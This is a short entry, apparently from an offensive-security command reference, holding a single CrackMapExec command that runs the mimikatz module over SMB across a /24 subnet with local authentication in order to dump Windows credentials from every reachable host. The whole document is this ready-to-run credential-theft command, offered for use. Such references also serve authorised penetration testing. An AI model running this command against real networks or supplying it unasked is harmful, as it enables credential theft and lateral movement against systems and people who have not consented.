---
id: a85f44cd-ac3c-4a3d-b4a4-72e6052088fc
name: Execute smb module with mimikatz module and local authentication
type: command
executor: bash
data: root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
output: null
created_at: '2023-04-06T03:56:01.851709+00:00'
updated_at: '2023-04-10T20:25:48.419627+00:00'
---

# Execute smb module with mimikatz module and local authentication

```bash
root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
```
